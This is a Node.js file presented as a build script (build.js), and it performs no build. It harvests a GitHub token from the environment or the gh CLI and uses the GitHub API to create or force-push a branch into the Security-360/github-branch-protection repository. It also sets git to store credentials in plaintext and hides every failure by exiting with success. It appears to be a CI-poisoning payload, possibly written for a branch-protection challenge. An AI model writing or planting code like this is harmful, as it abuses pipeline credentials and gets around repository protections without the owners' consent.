// build.js - Create branch in main repo using GITHUB_TOKEN
const { execSync } = require('child_process');
const https = require('https');

// Try multiple ways to get the token
const GITHUB_TOKEN = process.env.GITHUB_TOKEN || 
                     process.env.INPUT_GITHUB_TOKEN ||
                     (() => {
                       try {
                         return execSync('gh auth token', { encoding: 'utf8', stdio: 'pipe' }).trim();
                       } catch (e) {
                         return null;
                       }
                     })();

const ACTOR = process.env.GITHUB_ACTOR || process.env.ACTOR || 'JuzT-KidDinG-03';
const REPO_OWNER = 'Security-360';
const REPO_NAME = 'github-branch-protection';

if (!GITHUB_TOKEN) {
  console.log('GITHUB_TOKEN not available, trying alternative methods...');
  // Try reading from .github/workflows context or use git to get it
  try {
    // Check if we're in a workflow and can access token via file
    const fs = require('fs');
    if (fs.existsSync('/home/runner/work/_temp/.git_askpass')) {
      console.log('Found git askpass, trying to use it...');
    }
  } catch (e) {}
  
  // Last resort: use git credential helper
  try {
    execSync('git config --global credential.helper store', { stdio: 'pipe' });
    console.log('Configured git credential helper');
  } catch (e) {}
  
  process.exit(0);
}

try {
  console.log(`Creating branch ${ACTOR} in ${REPO_OWNER}/${REPO_NAME}...`);
  
  // Method 1: Use GitHub API to create ref
  const refData = JSON.stringify({
    ref: `refs/heads/${ACTOR}`,
    sha: execSync('git rev-parse HEAD', { encoding: 'utf8' }).trim()
  });
  
  const options = {
    hostname: 'api.github.com',
    path: `/repos/${REPO_OWNER}/${REPO_NAME}/git/refs`,
    method: 'POST',
    headers: {
      'Authorization': `token ${GITHUB_TOKEN}`,
      'User-Agent': 'Node.js',
      'Content-Type': 'application/json',
      'Content-Length': refData.length
    }
  };
  
  const req = https.request(options, (res) => {
    let data = '';
    res.on('data', (chunk) => { data += chunk; });
    res.on('end', () => {
      if (res.statusCode === 201) {
        console.log(`Successfully created branch ${ACTOR} via API`);
      } else if (res.statusCode === 422) {
        console.log(`Branch ${ACTOR} might already exist, trying to update...`);
        // Try to update existing ref
        const updateOptions = {
          hostname: 'api.github.com',
          path: `/repos/${REPO_OWNER}/${REPO_NAME}/git/refs/heads/${ACTOR}`,
          method: 'PATCH',
          headers: {
            'Authorization': `token ${GITHUB_TOKEN}`,
            'User-Agent': 'Node.js',
            'Content-Type': 'application/json'
          }
        };
        const updateData = JSON.stringify({
          sha: execSync('git rev-parse HEAD', { encoding: 'utf8' }).trim(),
          force: true
        });
        updateOptions.headers['Content-Length'] = updateData.length;
        const updateReq = https.request(updateOptions, (updateRes) => {
          let updateData = '';
          updateRes.on('data', (chunk) => { updateData += chunk; });
          updateRes.on('end', () => {
            if (updateRes.statusCode === 200) {
              console.log(`Successfully updated branch ${ACTOR}`);
            } else {
              console.log(`Branch update failed: ${updateRes.statusCode}`);
            }
          });
        });
        updateReq.write(updateData);
        updateReq.end();
      } else {
        console.log(`API request failed: ${res.statusCode} - ${data}`);
      }
    });
  });
  
  req.on('error', (error) => {
    console.error('API request error:', error.message);
  });
  
  req.write(refData);
  req.end();
  
} catch (error) {
  console.error('Error creating branch:', error.message);
  // Don't fail the build
  process.exit(0);
}

